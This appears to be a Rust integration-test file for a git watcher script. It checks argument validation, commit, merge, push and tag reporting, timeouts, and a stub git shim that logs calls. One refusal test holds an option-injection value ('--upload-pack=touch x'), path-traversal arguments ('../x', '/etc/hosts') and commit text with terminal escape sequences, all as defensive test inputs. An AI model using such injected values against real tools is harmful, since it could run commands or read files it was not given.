            .env("STEP_DIR", &dir)
            .env("STUB_OWNER", std::process::id().to_string())
            .envs(env.iter().copied());
        (c, dir)
    }

    fn armed(&self, args: &[&str], k: &str) -> Stepped {
        self.armed_env(args, k, &[])
    }

    fn armed_env(&self, args: &[&str], k: &str, env: &[(&str, &str)]) -> Stepped {
        let (mut c, dir) = self.cmd(args, k, env);
        Stepped { child: c.stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap(), dir }
    }

    /// A `git` on $PATH (with the `sleep` shim) ahead of the real one that logs each call to <base>/spy.log and, when
    /// $GIT_SPY_FAIL is 1, fails every fetch: returns that PATH and the log.
    fn spy(&self) -> (String, PathBuf) {
        let real = String::from_utf8(common::cmd("sh").args(["-c", "command -v git"]).output().unwrap().stdout).unwrap();
        let dir = self.base.join("spy");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("git"), format!(
            "#!/bin/sh\necho \"$*\" >> \"$GIT_SPY_LOG\"\ncase \"$GIT_SPY_FAIL $*\" in 1*\" fetch \"*) echo 'fatal: spy refuses fetch' >&2; exit 128;; esac\nexec {} \"$@\"\n",
            real.trim()
        )).unwrap();
        std::fs::set_permissions(dir.join("git"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        (format!("{}:{}:{}", dir.display(), self.base.join("shim").display(), std::env::var("PATH").unwrap()), self.base.join("spy.log"))
    }

    /// One run to its end with polls 1..=go pre-released: (exit code, stdout, stderr, polls taken).
    /// A run still going after BOUND (it polled past `go`) is killed and fails the test.
    fn run(&self, args: &[&str], k: &str, go: u32, env: &[(&str, &str)]) -> (Option<i32>, String, String, u32) {
        let (mut c, dir) = self.cmd(args, k, env);
        for n in 1..=go {
            std::fs::write(dir.join(format!("go-{n}")), "").unwrap();
        }
        let mut child = c.stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap();
        let t = Instant::now();
        while child.try_wait().unwrap().is_none() {
            if t.elapsed() > BOUND {
                child.kill().unwrap();
                child.wait().unwrap();
                panic!("watch {args:?} never returned");
            }
            std::thread::sleep(Duration::from_millis(10));
        }
        let o = child.wait_with_output().unwrap();
        let polls = std::fs::read_to_string(dir.join("polls")).map_or(0, |s| s.trim().parse().unwrap());
        (o.status.code(), String::from_utf8(o.stdout).unwrap(), String::from_utf8(o.stderr).unwrap(), polls)
    }
}

/// E-SEED2.W12 review r3: git under a test ignores whatever global or system config the environment
/// points at, so a user's tag.gpgSign (or any other setting) cannot change a test's outcome.
#[test]
fn hermetic_git_ignores_global_and_system_config() {
    let d = TempDir::new().unwrap();
    let hostile = d.path().join("gitconfig");
    std::fs::write(&hostile, "[tag]\n\tgpgSign = true\n").unwrap();
    let mut c = common::cmd("git");
    c.args(["config", "--list", "--show-origin"]).current_dir(d.path()).env("GIT_CONFIG_GLOBAL", &hostile).env("GIT_CONFIG_SYSTEM", &hostile);
    let o = hermetic(&mut c).output().unwrap();
    let list = String::from_utf8(o.stdout).unwrap();
    assert!(o.status.success() && !list.contains("gpgsign"), "{list}");
}

/// E-SEED2.W12: every argument router-watch.sh cannot validate is refused with exit 2 before its
/// first poll; no git option can ride in on a leading `-`.
#[test]
fn watch_refuses_bad_arguments_before_any_poll() {
    let w = watcher();
    let t = w.sha("HEAD");
    let tree = w.sha("HEAD^{tree}");
    for (args, why) in [
        (vec![], "kind"),
        (vec!["watch", "main"], "kind"),
        (vec!["signed"], "signed <tip>"),
        (vec!["signed", &t, "x"], "signed <tip>"),
        (vec!["merged", &t], "merged <tip> <target>"),
        (vec!["pushed", &t], "pushed <tip> <branch>"),
        (vec!["tagged"], "tagged <tag> [<sha>]"),
        (vec!["tagged", "v1", &t, "x"], "tagged <tag> [<sha>]"),
        (vec!["commit", "main"], "commit <branch> <old-tip>"),
        (vec!["pushed", &t, "--upload-pack=touch x"], "may not start with -"),
        (vec!["commit", "-b", &t], "may not start with -"),
        (vec!["commit", "main", &t, "-x"], "may not start with -"),
        (vec!["commit", "no/such", &t], "no branch"),
        (vec!["commit", "a..b", &t], "no branch"),
        (vec!["merged", &t, "nope"], "no branch"),
        (vec!["pushed", &t, "nope"], "no branch"),
        (vec!["tagged", "v1..2"], "bad tag"),
        (vec!["signed", "deadbeef"], "not a commit"),
        (vec!["signed", "HEAD"], "not a commit"),
        (vec!["signed", "abc"], "not a commit"),
        (vec!["signed", &tree], "not a commit"),
        (vec!["tagged", "v1", "deadbeef"], "not a commit"),
        (vec!["commit", "main", &t, "../x"], "bad path"),
        (vec!["commit", "main", &t, "a/../b"], "bad path"),
        (vec!["commit", "main", &t, "/etc/hosts"], "bad path"),
    ] {
        let (code, out, err, polls) = w.run(&args, "refuse", 0, &[]);
        assert!(
            code == Some(2) && out.is_empty() && err.starts_with("router-watch: ") && err.contains(why),
            "{args:?} not refused for {why}: {code:?} {out} {err}"
        );
        assert_eq!(polls, 0, "{args:?} polled before refusing");
    }
    let huge = "99999999999999999999";
    for (k, v) in [("ROUTER_WATCH_POLL", "x"), ("ROUTER_WATCH_POLL", "0"), ("ROUTER_WATCH_POLL", "1.5"), ("ROUTER_WATCH_POLL", "-1"), ("ROUTER_WATCH_POLL", huge), ("ROUTER_WATCH_MAX", "x"), ("ROUTER_WATCH_MAX", " 5"), ("ROUTER_WATCH_MAX", "1e3"), ("ROUTER_WATCH_MAX", huge)] {
        let (code, out, err, polls) = w.run(&["signed", &t], "knob", 0, &[(k, v)]);
        assert!(code == Some(2) && out.is_empty() && err.contains(k) && polls == 0, "{k}={v:?} not refused: {code:?} {out} {err}");
    }
}

/// E-SEED2.W12: `commit` fires when the branch moves and reports each commit with its Reviewed-By,
/// every landed path, and the staged paths that are missing or unexpected; a rewritten branch is
/// REWRITTEN.
#[test]
fn watch_commit_reports_what_landed_against_what_was_staged() {
    let w = watcher();
    let old = w.sha("HEAD");
    let mut s = w.armed(&["commit", "main", &old, "a", "b"], "partial");
    s.at(1);
    s.go(1);
    s.at(2);
    let a = w.commit(&["a"], "docs: a\n\nReviewed-By: username vuluu");
    s.go(2);
    assert_eq!(
        s.line(),
        format!("COMMITTED-PARTIAL branch=main from={old} to={a} commits=1 expected=1/2\n  commit {a} reviewed-by=username vuluu docs: a\n  landed A a\n  missing b\n")
    );

    // already true when armed: fires on the first check, before any poll
    let c = w.commit(&["c"], "c");
    let d = w.commit(&["d", "a"], "d");
    let (code, out, _, polls) = w.run(&["commit", "main", &old, "a", "c"], "already", 0, &[]);
    assert_eq!((code, polls), (Some(0), 0));
    assert_eq!(
        out,
        format!(
            "COMMITTED branch=main from={old} to={d} commits=3 expected=2/2\n  commit {a} reviewed-by=username vuluu docs: a\n  commit {c} reviewed-by=none c\n  commit {d} reviewed-by=none d\n  landed A a\n  landed A c\n  landed A d\n  unexpected d\n"
        )
    );
    let (_, out, _, _) = w.run(&["commit", "main", &c], "nopaths", 0, &[]);
    assert_eq!(out, format!("COMMITTED branch=main from={c} to={d} commits=1 expected=0/0\n  commit {d} reviewed-by=none d\n  landed M a\n  landed A d\n"));

    let mut s = w.armed(&["commit", "main", &d], "rewritten");
    s.at(1);
    git(&w.main, &["commit", "-q", "--amend", "-m", "d2"]);
    s.go(1);
    let d2 = w.sha("HEAD");
    assert_eq!(s.line(), format!("REWRITTEN branch=main from={d} to={d2}\n"));

    // a folded trailer is one value; control characters in commit text never reach the router raw
    let f = w.commit(&["f"], "f \x1b[2Jx\ry\n\nReviewed-By: username\n vuluu\x07");
    let (_, out, _, _) = w.run(&["commit", "main", &d2], "folded", 0, &[]);
    assert_eq!(out, format!("COMMITTED branch=main from={d2} to={f} commits=1 expected=0/0\n  commit {f} reviewed-by=username vuluu? f ?[2Jx?y\n  landed A f\n"));

    // a net-empty range with staged paths: every path missing, no stray line
    let e = w.commit(&["e"], "e");
    git(&w.main, &["rm", "-q", "e"]);
    git(&w.main, &["commit", "-qm", "drop e"]);
    let de = w.sha("HEAD");
    let (_, out, _, _) = w.run(&["commit", "main", &f, "e"], "empty", 0, &[]);
    assert_eq!(out, format!("COMMITTED-PARTIAL branch=main from={f} to={de} commits=2 expected=0/1\n  commit {e} reviewed-by=none e\n  commit {de} reviewed-by=none drop e\n  missing e\n"));

    // a branch deleted mid-watch is DELETED, not a rewrite
    git(&w.main, &["branch", "wu/gone"]);
    let g = w.sha("wu/gone");
    let mut s = w.armed(&["commit", "wu/gone", &g], "deleted");
    s.at(1);
    git(&w.main, &["branch", "-q", "-D", "wu/gone"]);
    s.go(1);
    assert_eq!(s.line(), format!("DELETED branch=wu/gone from={g}\n"));
}

/// E-SEED2.W12: `signed` fires on the mr note and prints its payload; `merged` fires once the tip is in
/// the target and says how it got there.
#[test]
fn watch_signed_and_merged_report_the_note_and_how_the_tip_landed() {
    let w = watcher();
    let t = w.sha("HEAD");
    let mut s = w.armed(&["signed", &t], "signed");
    s.at(1);
    git(&w.main, &["notes", "--ref=mr", "add", "-m", "level: wu\nby: vu\rluu\x1b]0;x\x07\x7f\nu: \u{7e}\u{80}\u{9b}\u{9f}\u{a0}\u{e9}|\u{2027}\u{2028}\u{2029}\u{202e}\u{202f}|\u{2065}\u{2066}\u{2069}\u{206a}", &t]);
    s.go(1);
    assert_eq!(s.line(), format!("SIGNED tip={t}\n  level: wu\n  by: vu?luu?]0;x??\n  u: ~???\u{a0}\u{e9}|\u{2027}???\u{202f}|\u{2065}??\u{206a}\n"));

    git(&w.main, &["switch", "-q", "-c", "wu/x"]);
    let x = w.commit(&["x"], "x");
    git(&w.main, &["switch", "-q", "main"]);
    let mut s = w.armed(&["merged", &x, "main"], "noff");
    s.at(1);
    git(&w.main, &["merge", "-q", "--no-ff", "-m", "merge x", "wu/x"]);
    s.go(1);
    assert_eq!(s.line(), format!("MERGED tip={x} target=main at={} how=no-ff\n", w.sha("main")));

    git(&w.main, &["switch", "-q", "-c", "wu/y"]);
    let y = w.commit(&["y"], "y");
    git(&w.main, &["switch", "-q", "main"]);
    git(&w.main, &["merge", "-q", "--ff-only", "wu/y"]);
    let (_, out, _, polls) = w.run(&["merged", &y, "main"], "ff", 0, &[]);
    assert_eq!((out, polls), (format!("MERGED tip={y} target=main at={y} how=ff\n"), 0));

    git(&w.main, &["switch", "-q", "-c", "wu/z"]);
    let z = w.commit(&["z"], "z");
    git(&w.main, &["switch", "-q", "-c", "wu/z2"]);
    w.commit(&["z2"], "z2");
    git(&w.main, &["switch", "-q", "main"]);
    git(&w.main, &["merge", "-q", "--no-ff", "-m", "merge z2", "wu/z2"]);
    let (_, out, _, _) = w.run(&["merged", &z, "main"], "contained", 0, &[]);
    assert_eq!(out, format!("MERGED tip={z} target=main at={} how=contained\n", w.sha("main")));

    // review r3 (owner ruling V1-A): a target deleted mid-watch ends the watch at once, quietly
    git(&w.main, &["branch", "epic/gone"]);
    git(&w.main, &["switch", "-q", "-c", "wu/v"]);
    let v = w.commit(&["v"], "v");
    git(&w.main, &["switch", "-q", "main"]);
    let mut s = w.armed(&["merged", &v, "epic/gone"], "target-deleted");
    s.at(1);
    git(&w.main, &["branch", "-q", "-D", "epic/gone"]);
    s.go(1);
    let dir = s.dir.clone();
    until("the merged watch to end", || s.child.try_wait().unwrap().is_some());
    let o = s.child.wait_with_output().unwrap();
    assert_eq!((o.status.code(), String::from_utf8(o.stdout).unwrap(), String::from_utf8(o.stderr).unwrap()), (Some(0), "DELETED target=epic/gone\n".into(), String::new()));
    assert_eq!(std::fs::read_to_string(dir.join("polls")).unwrap().trim(), "1");
}

/// E-SEED2.W12 review r1: a branch that exists only locally is "not pushed yet", never a network
/// failure; the watch keeps polling past 5 attempts and fires PUSHED after the first push.
#[test]
fn watch_pushed_waits_on_a_local_only_branch_without_reporting_unreachable() {
    let w = watcher();
    git(&w.main, &["switch", "-q", "-c", "wu/local"]);
    let t = w.commit(&["l"], "l");
    let mut s = w.armed(&["pushed", &t, "wu/local"], "local-only");
    s.at(1);
    for n in 1..=5 {
        s.go(n);
        s.at(n + 1);
    }
    git(&w.main, &["push", "-q", "origin", "wu/local"]);
    s.go(6);
    assert_eq!(s.line(), format!("PUSHED tip={t} branch=wu/local origin={t}\n"));
}

/// The test harness itself: a watch that polls more than the test released fails the test in
/// bounded time instead of hanging `cargo test`, and leaves no `sleep` shim behind.
#[test]
fn watcher_run_is_bounded_when_the_watch_outpolls_its_releases() {
    let w = watcher();
    let t = w.sha("HEAD");
    let e = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| w.run(&["signed", &t], "unreleased", 0, &[]))).unwrap_err();
    assert!(e.downcast_ref::<String>().is_some_and(|m| m.contains("never returned")));
    let shim = w.base.join("shim/sleep");
    let shim = shim.to_str().unwrap();
    until("the sleep shim to exit", || {
        let o = Command::new("ps").args(["-A", "-o", "command="]).output().unwrap();
        !String::from_utf8_lossy(&o.stdout).contains(shim)
    });
}

/// E-SEED2.W12: `pushed` fires only once origin holds the tip (not on the local merge); `tagged` fires
/// once origin lists the tag and flags a tag on another commit.
#[test]
fn watch_pushed_and_tagged_fire_on_origin_only() {
    let w = watcher();
    let base = w.sha("HEAD");
    git(&w.main, &["switch", "-q", "-c", "wu/p"]);
    let t = w.commit(&["p"], "p");
    git(&w.main, &["switch", "-q", "main"]);
    let mut s = w.armed(&["pushed", &t, "main"], "pushed");
    s.at(1);
    git(&w.main, &["merge", "-q", "--no-ff", "-m", "merge p", "wu/p"]);
    s.go(1);
    s.at(2);
    git(&w.main, &["push", "-q", "origin", "main"]);
    s.go(2);
    assert_eq!(s.line(), format!("PUSHED tip={t} branch=main origin={}\n", w.sha("main")));

    // the fetch writes refs/remotes/origin/<b> and nothing else: no auto-followed tag, no FETCH_HEAD
    let other = w.base.join("other");
    git(&w.base, &["clone", "-q", w.base.join("origin.git").to_str().unwrap(), other.to_str().unwrap()]);
    git(&other, &["commit", "-q", "--allow-empty", "-m", "o"]);
    git(&other, &["tag", "-a", "vo", "-m", "vo"]);
    git(&other, &["push", "-q", "origin", "main", "vo"]);
    let o = String::from_utf8(git(&other, &["rev-parse", "HEAD"]).stdout).unwrap().trim().to_string();
    let m = w.sha("main");
    let refs = || String::from_utf8(git(&w.main, &["for-each-ref", "--format=%(refname) %(objectname)"]).stdout).unwrap();
    git(&w.main, &["update-ref", "-d", "refs/remotes/origin/HEAD"]);
    git(&w.main, &["config", "remote.origin.followRemoteHEAD", "always"]);
    let before = refs();
    let (_, out, _, _) = w.run(&["pushed", &m, "main"], "only-ref", 0, &[]);
    assert_eq!(out, format!("PUSHED tip={m} branch=main origin={o}\n"));
    let after = refs();
    let changed: Vec<&str> = after.lines().filter(|l| !before.lines().any(|b| b == *l)).collect();
    assert_eq!(changed, [format!("refs/remotes/origin/main {o}")], "pushed wrote more than its ref:\n{after}");
    let gitdir = w.main.join(".git");
    assert!(!gitdir.join("FETCH_HEAD").exists(), "pushed wrote FETCH_HEAD");

    // origin/<b> already at origin's tip: no fetch
    let (path, log) = w.spy();
    let (_, out, _, _) = w.run(&["pushed", &m, "main"], "no-fetch", 0, &[("PATH", &path), ("GIT_SPY_LOG", log.to_str().unwrap())]);
    assert_eq!(out, format!("PUSHED tip={m} branch=main origin={o}\n"));
    let calls = std::fs::read_to_string(&log).unwrap();
    assert!(calls.contains("ls-remote") && !calls.contains("fetch"), "{calls}");

    let mut s = w.armed(&["tagged", "v1", &t], "tagged");
    s.at(1);
    git(&w.main, &["tag", "-a", "v1", "-m", "v1", &t]);
    s.go(1);
    s.at(2);
    git(&w.main, &["push", "-q", "origin", "v1"]);
    s.go(2);
    assert_eq!(s.line(), format!("TAGGED tag=v1 object={} commit={t}\n", w.sha("v1")));

    git(&w.main, &["tag", "v2", &base]);
    git(&w.main, &["push", "-q", "origin", "v2"]);
    let (_, out, _, _) = w.run(&["tagged", "v2", &t], "mismatch", 0, &[]);
    assert_eq!(out, format!("TAGGED-MISMATCH tag=v2 object={base} commit={base} expected={t}\n"));
}

/// E-SEED2.W12: past its deadline the watch prints TIMEOUT; a network kind gives up after 5 failed
/// attempts in a row with UNREACHABLE and the last error in plain words.
#[test]
fn watch_times_out_and_reports_an_unreachable_origin() {
    let w = watcher();
    let t = w.sha("HEAD");
    let (code, out, _, polls) = w.run(&["signed", &t], "timeout", 0, &[("ROUTER_WATCH_MAX", "0")]);
    assert_eq!((code, out.as_str(), polls), (Some(0), "TIMEOUT kind=signed waited=0m\n", 0));

    git(&w.main, &["remote", "set-url", "origin", w.base.join("missing.git").to_str().unwrap()]);
    for (args, k) in [(vec!["pushed", t.as_str(), "main"], "pushed"), (vec!["tagged", "v1"], "tagged")] {
        let (code, out, _, polls) = w.run(&args, &format!("unreachable-{k}"), 4, &[]);
        let err = out.strip_prefix(&format!("UNREACHABLE kind={k} remote=origin error=")).unwrap_or_else(|| panic!("{out}"));
        assert!(code == Some(0) && out.lines().count() == 1 && err.trim().len() > 1, "{out}");
        assert!(err.trim_end().chars().all(|c| c.is_ascii_alphanumeric() || " ._/:=@%,+^~-".contains(c)), "{out}");
        assert_eq!(polls, 4, "{k}: 5 attempts, 4 polls between them");
    }

    // a success resets the count: 4 failures, 1 success, then 5 more failures before UNREACHABLE
    git(&w.main, &["commit", "-q", "--allow-empty", "-m", "local only"]);
    let local = w.sha("HEAD");
    let mut s = w.armed(&["pushed", &local, "main"], "reset");
    for n in 1..=3 {
        s.go(n);
    }
    s.at(4);
    git(&w.main, &["remote", "set-url", "origin", w.base.join("origin.git").to_str().unwrap()]);
    s.go(4);
    s.at(5);
    git(&w.main, &["remote", "set-url", "origin", w.base.join("missing.git").to_str().unwrap()]);
    for n in 5..=9 {
        s.go(n);
    }
    let dir = s.dir.clone();
    let out = s.line();
    assert!(out.starts_with("UNREACHABLE kind=pushed "), "{out}");
    assert_eq!(std::fs::read_to_string(dir.join("polls")).unwrap().trim(), "9", "the count did not reset on success");

    // review r3: a poll whose ls-remote works but whose fetch fails is a failed attempt; a poll that
    // finds the branch missing on origin is a good one and resets the count
    git(&w.main, &["remote", "set-url", "origin", w.base.join("origin.git").to_str().unwrap()]);
    git(&w.main, &["push", "-q", "origin", "main"]);
    let tip = w.sha("main");
    let other = w.base.join("other-f");
    git(&w.base, &["clone", "-q", w.base.join("origin.git").to_str().unwrap(), other.to_str().unwrap()]);
    git(&other, &["commit", "-q", "--allow-empty", "-m", "ahead"]);
    git(&other, &["push", "-q", "origin", "HEAD:refs/heads/wu/f"]);
    git(&w.main, &["fetch", "-q", "origin", "wu/f"]);
    git(&other, &["commit", "-q", "--allow-empty", "-m", "ahead2"]);
    git(&other, &["push", "-q", "origin", "HEAD:refs/heads/wu/f"]);
    let (path, _) = w.spy();
    let log = w.base.join("spy.log");
    let env = [("PATH", path.as_str()), ("GIT_SPY_LOG", log.to_str().unwrap()), ("GIT_SPY_FAIL", "1")];
    let mut s = w.armed_env(&["pushed", &tip, "wu/f"], "fetch-fails", &env);
    for n in 1..=3 {
        s.go(n);
    }
    s.at(4);
    git(&other, &["push", "-q", "origin", "--delete", "wu/f"]);
    s.go(4);
    s.at(5);
    git(&other, &["push", "-q", "origin", "HEAD:refs/heads/wu/f"]);
    for n in 5..=9 {
        s.go(n);
    }
    let dir = s.dir.clone();
    let out = s.line();
    assert_eq!(out, "UNREACHABLE kind=pushed remote=origin error=fatal: spy refuses fetch\n");
    assert_eq!(std::fs::read_to_string(dir.join("polls")).unwrap().trim(), "9", "a missing branch did not reset the count");
}
